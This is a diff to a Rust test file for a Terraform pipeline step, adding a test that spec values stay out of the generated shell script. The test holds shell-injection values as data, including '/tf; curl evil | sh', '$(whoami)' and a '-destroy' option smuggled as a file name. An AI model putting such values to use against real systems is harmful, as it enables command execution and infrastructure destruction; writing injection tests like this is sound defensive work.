@@ -1,6 +1,51 @@
 use super::*;
 use uuid::Uuid;
 
+fn env(spec: &Value, name: &str) -> String {
+    spec["env"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|e| e["name"] == name)
+        .unwrap_or_else(|| panic!("{name} is not set"))["value"]
+        .as_str()
+        .unwrap()
+        .to_string()
+}
+
+#[tokio::test]
+async fn values_never_become_part_of_the_script() {
+    let mut step_type = "TerraformPlan".to_string();
+    let mut spec = serde_json::json!({
+        "workspace_dir": "/tf; curl evil | sh",
+        "backend_bucket": "b' && whoami && echo '",
+        "backend_key": "$(whoami)",
+        "region": "us-east-1`whoami`",
+        "out_file": "plan; whoami"
+    });
+    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
+        .await
+        .unwrap();
+    let script = spec["command"][2].as_str().unwrap();
+    for hostile in ["curl", "whoami", "`"] {
+        assert!(!script.contains(hostile), "{hostile} in {script}");
+    }
+    assert_eq!(env(&spec, "STORMCHASER_TF_DIR"), "/tf; curl evil | sh");
+    assert_eq!(env(&spec, "STORMCHASER_TF_BACKEND_KEY"), "$(whoami)");
+    assert_eq!(env(&spec, "AWS_REGION"), "us-east-1`whoami`");
+
+    // A plan file that would be read as an option
+    for out_file in ["-destroy", ""] {
+        let mut step_type = "TerraformApply".to_string();
+        let mut spec = serde_json::json!({ "out_file": out_file });
+        assert!(
+            mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
+                .await
+                .is_err()
+        );
+    }
+}
+
 #[tokio::test]
 async fn test_terraform_plan_mutates_to_run_container() {
     let mut step_type = "TerraformPlan".to_string();
@@ -18,19 +63,19 @@ async fn test_terraform_plan_mutates_to_run_container() {
 
     assert_eq!(step_type, "RunContainer");
     let image = spec.get("image").and_then(|v| v.as_str()).unwrap();
-    assert_eq!(image, "hashicorp/terraform:latest");
+    assert_eq!(image, DEFAULT_TERRAFORM_IMAGE);
 
     let command = spec.get("command").and_then(|v| v.as_array()).unwrap();
     assert_eq!(command[0], "sh");
     assert_eq!(command[1], "-c");
     let script = command[2].as_str().unwrap();
     assert!(
-        script.contains("terraform plan -out=tfplan"),
+        script.contains(r#"terraform plan -out="$STORMCHASER_TF_OUT""#),
         "missing plan command: {}",
         script
     );
     assert!(
-        script.contains("terraform show -no-color tfplan"),
+        script.contains(r#"terraform show -no-color "$STORMCHASER_TF_OUT""#),
         "missing show command: {}",
         script
     );
@@ -73,10 +118,11 @@ async fn test_terraform_apply_mutates_to_run_container() {
         script
     );
     assert!(
-        script.contains("myplan"),
+        script.contains(r#"terraform apply -auto-approve "$STORMCHASER_TF_OUT""#),
         "out_file not used in apply: {}",
         script
     );
+    assert_eq!(env(&spec, "STORMCHASER_TF_OUT"), "myplan");
     assert!(
         script.contains("--- TF OUTPUTS ---"),
         "missing tf outputs marker: {}",
@@ -105,27 +151,28 @@ async fn test_terraform_plan_uses_out_file_consistently() {
     let script = command[2].as_str().unwrap();
     // All terraform show invocations must use the custom out_file, not a hardcoded 'tfplan'
     assert!(
-        script.contains("terraform plan -out=custom_plan_file"),
+        script.contains(r#"terraform plan -out="$STORMCHASER_TF_OUT""#),
         "plan out_file: {}",
         script
     );
     assert!(
-        script.contains("terraform show -no-color custom_plan_file"),
+        script.contains(r#"terraform show -no-color "$STORMCHASER_TF_OUT""#),
         "show uses out_file: {}",
         script
     );
     assert!(
-        script.contains("terraform show -json custom_plan_file"),
+        script.contains(r#"terraform show -json "$STORMCHASER_TF_OUT""#),
         "show json uses out_file: {}",
         script
     );
+    assert_eq!(env(&spec, "STORMCHASER_TF_OUT"), "custom_plan_file");
     assert!(
-        !script.contains("terraform show -no-color tfplan"),
+        !script.contains("tfplan"),
         "hardcoded tfplan found: {}",
         script
     );
     assert!(
-        !script.contains("terraform show -json tfplan"),
+        !script.contains("custom_plan_file"),
         "hardcoded tfplan in json: {}",
         script
     );
